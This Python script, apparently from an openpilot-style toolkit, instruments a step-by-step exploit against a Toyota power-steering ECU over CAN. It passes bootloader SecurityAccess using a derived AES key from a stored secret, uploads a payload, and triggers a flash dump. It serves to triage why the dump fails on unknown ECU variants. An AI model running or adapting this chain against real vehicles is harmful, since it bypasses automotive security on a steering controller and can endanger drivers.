#!/usr/bin/env python3
"""Instrumented DataFlash dump: run the production dump flow step by step and record
everything — panda info, EPS identity DIDs, every UDS response and negative-response
code (NRC), and a full traceback on the failing step.

For triaging an unknown EPS outside the known 8965B4x transfer family where the plain
dump only shows "Dump failed." with no reason. Same UDS sequence, addresses, payload,
and timing as dump_dataflash.dump(); the only difference is per-step capture instead of
collapse-to-RetryError. It runs the real dump: if security access passes it uploads and
triggers the payload like production, with the collection window capped shorter.

The identity sweep also answers the standing "capture the EPS app-string every run"
item — the 8965B... part string that names the EPS variant.
"""
import hashlib
import struct
import subprocess
import time
import traceback as _tb
from pathlib import Path

from tsk.lib.diagnostic_route import (
  AmbiguousDiagnosticRouteError, DEFAULT_BUS_ORDER, discover_eps_route_with_routing, route_fields,
)
from tsk.lib.env import is_agnos, DATAFLASH_PAYLOAD_PATH
from tsk.lib.extractor import NotAGNOSError, TSKExtractor
from tsk.lib.programming import ProgrammingHandoffError, enter_programming_bootloader, uds_client
from tsk.lib.dump_dataflash import (
  ADDR, DUMP_START, DUMP_TOTAL, PAYLOAD_LOAD_ADDR, PAYLOAD_LOAD_SIZE,
  PAYLOAD_SHA256, TRIGGER_ADDR, TRIGGER_SIZE, RESPONSE_PENDING,
)

DIAG_COLLECT_SECONDS = 30.0   # shorter than the production 240s cap — a probe, not a full dump
DIAG_IDLE_TIMEOUT = 5.0

# Logical bus alone is not a complete route: discovery tests explicit Panda physical
# routing states and then candidate logical buses. Stateful work preserves the exact
# discovered (ELM parameter, bus, tx, rx) tuple.
CANDIDATE_BUSES = list(DEFAULT_BUS_ORDER)

# EPS identity DIDs worth reading on an unknown ECU. The spare-part number (0xF187)
# and application SW id (0xF181) carry the 8965B... string that names the EPS variant;
# the rest add supplier / hardware / software detail. Each is read independently so one
# rejection doesn't stop the sweep.
IDENTITY_DIDS = [
  (0xF181, "app_sw_id"),
  (0xF187, "spare_part_no"),
  (0xF193, "supplier_hw_ver"),
  (0xF195, "supplier_sw_ver"),
  (0xF18C, "ecu_serial"),
  (0xF191, "mfr_ecu_hw_no"),
  (0xF18A, "supplier_id"),
  (0xF194, "supplier_sw_no"),
  (0xF180, "boot_sw_id"),
]


def _noop(**kwargs) -> None:
  pass


def _ascii(b: bytes) -> str:
  return "".join(chr(c) if 32 <= c < 127 else "." for c in b)


def diagnose(progress_cb=None) -> dict:
  """Run the dump flow with per-step instrumentation. Returns:
    {status, panda, identity[], steps[], failed_at, exception, traceback,
     frames, bytes, message}
  status is "dumped" | "no_frames" | "rejected" | "failed". Raises NotAGNOSError off-device.
  """
  if not is_agnos():
    raise NotAGNOSError

  cb = progress_cb or _noop

  from Crypto.Cipher import AES
  from opendbc.car.isotp import isotp_send
  from opendbc.car.uds import ACCESS_TYPE, SESSION_TYPE, SERVICE_TYPE, \
    ROUTINE_CONTROL_TYPE, InvalidServiceIdError, MessageTimeoutError, NegativeResponseError
  try:
    from opendbc.car.uds import _negative_response_codes as NRC_TABLE
  except Exception:
    NRC_TABLE = {}

  steps: list = []
  identity: list = []
  result = {
    "status": "failed", "panda": "", "eps_bus": -1, "identity": identity, "steps": steps,
    "failed_at": "", "exception": "", "traceback": "", "frames": 0, "bytes": 0,
    "message": "",
  }

  def record(name, ok, detail, t0) -> None:
    steps.append({"name": name, "ok": ok, "detail": detail, "ms": int((time.time() - t0) * 1000)})
    cb(steps=len(steps), last=name)

  def note_fail(name, exc) -> None:
    result["failed_at"] = name
    result["exception"] = f"{type(exc).__name__}: {exc}" if str(exc) else type(exc).__name__
    result["traceback"] = _tb.format_exc()

  def nrc(code) -> str:
    return f"NRC 0x{code:02x} {NRC_TABLE.get(code, 'unknown')}"

  def call(name, fn):
    """Run a critical UDS step. Records it; on failure records the NRC/traceback and
    returns (False, None) so the caller can stop the chain. Never re-raises."""
    t0 = time.time()
    try:
      val = fn()
      detail = val.hex() if isinstance(val, (bytes, bytearray)) else "ok"
      record(name, True, detail, t0)
      return True, val
    except NegativeResponseError as e:
      record(name, False, nrc(e.error_code), t0)
      note_fail(name, e)
      return False, None
    except Exception as e:
      record(name, False, f"{type(e).__name__}: {e}" if str(e) else type(e).__name__, t0)
      note_fail(name, e)
      return False, None

  # Kill the manager so pandad doesn't fight for the panda (mirrors dump()).
  subprocess.run(["pkill", "-9", "-f", "manager.py"], check=False)
  subprocess.run(["pkill", "-9", "-f", "pandad"], check=False)
  time.sleep(2)

  # Phase A: connect + panda info.
  t0 = time.time()
  try:
    panda = TSKExtractor._connect_panda()
    try:
      ver = panda.get_version()
      ver = ver.decode(errors="replace") if isinstance(ver, (bytes, bytearray)) else str(ver)
    except Exception:
      ver = "unknown"
    result["panda"] = ver
    record("connect panda", True, f"fw {ver}", t0)
  except Exception as e:
    record("connect panda", False, f"{type(e).__name__}: {e}" if str(e) else type(e).__name__, t0)
    note_fail("connect panda", e)
    result["message"] = "No panda / connect failed. Check the harness."
    return result

  # Phase B: discover both dimensions of the route. Normal-harness (ELM param 1)
  # is tried before the OBD mux, so bus 1/FDCAN2 is not silently pinned to OBD.
  t0 = time.time()
  try:
    route = discover_eps_route_with_routing(
      panda, CANDIDATE_BUSES, preferred_tx=ADDR, addresses=[ADDR],
      preferred_timeout=0.4, scan_timeout=0.1,
    )
  except AmbiguousDiagnosticRouteError as e:
    record("discover EPS route", False, f"ambiguous route: {e}", t0)
    result.update(status="rejected", message=f"Ambiguous EPS diagnostic route: {e}")
    return result
  if route is None:
    record("discover EPS route", False, "no response under normal-harness or OBD routing", t0)
    result["status"] = "rejected"
    result["message"] = ("EPS did not answer on bus 0, 1, or 2 under either explicit Panda routing state. "
                         "The EPS may be unpowered or the harness topology is outside the known routes.")
    return result
  if route["tx"] != ADDR or route["rx"] != ADDR + 8 or route["tx_bus"] != route["rx_bus"]:
    record("discover EPS route", False, f"unexpected transfer endpoint {route_fields(route)}", t0)
    result.update(status="rejected", message="Responder is not compatible with the Sienna payload endpoint.")
    return result

  result.update(**route_fields(route))
  eps_bus = route["tx_bus"]
  uds = uds_client(panda, route, timeout=0.3, response_pending_timeout=5.5)
  record("discover EPS route", True, str(route_fields(route)), t0)
  time.sleep(0.5)

  call("session EXTENDED", lambda: uds.diagnostic_session_control(SESSION_TYPE.EXTENDED_DIAGNOSTIC))
  time.sleep(0.7)

  # Identity sweep — independent reads, never stops the run.
  for did, label in IDENTITY_DIDS:
    t0 = time.time()
    try:
      data = uds.read_data_by_identifier(did)
      identity.append({"did": f"0x{did:04x}", "name": label,
                       "hex": bytes(data).hex(), "ascii": _ascii(bytes(data))})
    except NegativeResponseError as e:
      identity.append({"did": f"0x{did:04x}", "name": label, "hex": "", "ascii": nrc(e.error_code)})
    except Exception as e:
      identity.append({"did": f"0x{did:04x}", "name": label, "hex": "",
                       "ascii": type(e).__name__})
  cb(steps=len(steps), last="identity")

  # Phase C: application -> bootloader handoff. A timeout after NRC 0x78 can be the
  # expected reset path, so require reappearance on the exact preserved Panda route
  # rather than equating a missing final 50 02 with refusal.
  t0 = time.time()
  try:
    route, handoff = enter_programming_bootloader(panda, route, prepare_sessions=False)
    result["programming_handoff"] = handoff
    result.update(**route_fields(route))
    eps_bus = route["tx_bus"]
    record("session PROGRAMMING handoff", True, str(handoff), t0)
  except ProgrammingHandoffError as e:
    result["programming_handoff"] = e.telemetry
    detail = f"NRC 0x{e.nrc:02x}" if e.nrc is not None else str(e)
    record("session PROGRAMMING handoff", False, detail, t0)
    result["status"] = "rejected"
    result["message"] = f"Programming handoff did not complete: {detail}."
    return result

  uds = uds_client(panda, route, timeout=0.3, response_pending_timeout=3.0)
  ok, _ = call("bootloader session DEFAULT", lambda: uds.diagnostic_session_control(SESSION_TYPE.DEFAULT))
  if not ok:
    result.update(status="rejected", message="Bootloader reappeared but DEFAULT session was rejected.")
    return result
  ok, _ = call("bootloader session EXTENDED", lambda: uds.diagnostic_session_control(SESSION_TYPE.EXTENDED_DIAGNOSTIC))
  if not ok:
    result.update(status="rejected", message="Bootloader reappeared but EXTENDED session was rejected.")
    return result
  ok, _ = call("bootloader session PROGRAMMING", lambda: uds.diagnostic_session_control(SESSION_TYPE.PROGRAMMING))
  if not ok:
    result.update(status="rejected", message="Bootloader reappeared but PROGRAMMING session was rejected.")
    return result

  # Phase D: security access — the key question. Record the seed and whether SEND_KEY
  # is accepted or rejected (NRC 0x35 invalid key / 0x33 access denied on a wrong secret).
  ok, seed = call("security REQUEST_SEED",
                  lambda: uds.security_access(ACCESS_TYPE.REQUEST_SEED, data_record=b"\x00" * 16))
  if not ok:
    result["status"] = "rejected"
    result["message"] = "EPS rejected the seed request."
    return result

  try:
    derived = AES.new(TSKExtractor.BOOT_SA_SECRET, AES.MODE_ECB).decrypt(b"\x00" * 16)
    sent_key = AES.new(derived, AES.MODE_ECB).encrypt(bytes(seed))
  except Exception as e:
    record("compute key", False, f"{type(e).__name__}: {e}", time.time())
    note_fail("compute key", e)
    result["message"] = "Key computation failed (unexpected seed shape)."
    return result

  ok, _ = call("security SEND_KEY", lambda: uds.security_access(ACCESS_TYPE.SEND_KEY, sent_key))
  if not ok:
    result["status"] = "rejected"
    result["message"] = ("EPS rejected the known 8965B4x bootloader 01/02 SecurityAccess key. "
                         "The bootloader secret/algorithm differs or the request state is wrong.")
    return result

  # Phase E: payload upload (only reached if security passed — a surprise for a non-family car).
  payload = Path(DATAFLASH_PAYLOAD_PATH).read_bytes()
  sha_ok = hashlib.sha256(payload).hexdigest() == PAYLOAD_SHA256
  record("payload sha256", sha_ok, "match" if sha_ok else "MISMATCH", time.time())

  ok, _ = call("write DID 0x203", lambda: uds.write_data_by_identifier(0x203, b"\x00" * 5))
  if ok:
    call("write DID 0x201", lambda: uds.write_data_by_identifier(0x201, TSKExtractor.DID_201_KEY))
    call("write DID 0x202", lambda: uds.write_data_by_identifier(0x202, TSKExtractor.DID_202_IV))
    req = b"\x01\x46\x01\x00" + struct.pack("!I", PAYLOAD_LOAD_ADDR) + struct.pack("!I", PAYLOAD_LOAD_SIZE)
    up_ok, _ = call("request download",
                    lambda: uds._uds_request(SERVICE_TYPE.REQUEST_DOWNLOAD, data=req))
    if up_ok:
      chunk = 0x400
      xfer_ok = True
      for i in range(len(payload) // chunk):
        ok_i, _ = call(f"transfer_data {i + 1}",
                       lambda i=i: uds.transfer_data(i + 1, payload[i * chunk:(i + 1) * chunk]))
        if not ok_i:
          xfer_ok = False
          break
      if xfer_ok:
        call("transfer_exit", lambda: uds.request_transfer_exit())
        verify = b"\x45\x00" + struct.pack("!I", PAYLOAD_LOAD_ADDR) + struct.pack("!I", PAYLOAD_LOAD_SIZE)
        call("verify routine 0x10f0", lambda: uds.routine_control(ROUTINE_CONTROL_TYPE.START, 0x10f0, verify))

  # Phase F: trigger + collect (capped short). Report frames/bytes even if the chain
  # above had a soft failure — we want to see whether anything comes back.
  t0 = time.time()
  try:
    erase = b"\x31\x01\xff\x00" + b"\x45\x00" + struct.pack("!I", TRIGGER_ADDR) + struct.pack("!I", TRIGGER_SIZE)
    isotp_send(panda, erase, route["tx"], bus=eps_bus)
    record("trigger erase", True, f"sent on bus {eps_bus}", t0)
  except Exception as e:
    record("trigger erase", False, f"{type(e).__name__}: {e}" if str(e) else type(e).__name__, t0)

  received = bytearray(DUMP_TOTAL)
  frames = 0
  covered = 0
  begin = time.time()
  last = begin
  while time.time() - begin < DIAG_COLLECT_SECONDS:
    progressed = False
    try:
      recv = panda.can_recv()
    except Exception:
      break
    for addr, *_, data, bus in recv:
      if bus != route["rx_bus"] or addr != route["rx"] or len(data) < 8 or data == RESPONSE_PENDING:
        continue
      ptr = (struct.unpack("<I", data[:4])[0] >> 8) & 0xFFFFFF
      off = ((DUMP_START & 0xFF000000) | ptr) - DUMP_START
      if off < 0 or off + 4 > DUMP_TOTAL:
        continue
      for k in range(off, off + 4):
        if received[k] == 0:
          received[k] = 1
          covered += 1
      frames += 1
      progressed = True
    if progressed:
      last = time.time()
    elif time.time() - last > DIAG_IDLE_TIMEOUT:
      break
    else:
      time.sleep(0.001)
    if covered >= DUMP_TOTAL:
      break

  record("collect", frames > 0, f"{frames} frames, {covered}/{DUMP_TOTAL} bytes", begin)
  result["frames"] = frames
  result["bytes"] = covered

  if covered >= DUMP_TOTAL:
    result["status"] = "dumped"
    result["message"] = "Full dump — the exploit works on this ECU."
  elif frames > 0:
    result["status"] = "no_frames"
    result["message"] = f"Security passed and the payload ran, but only {covered}/{DUMP_TOTAL} bytes came back."
  else:
    result["status"] = "no_frames"
    result["message"] = ("Security passed and the payload was uploaded, but the trigger produced no "
                         "dump frames. The exploit reached the EPS but did not execute as expected.")
  return result
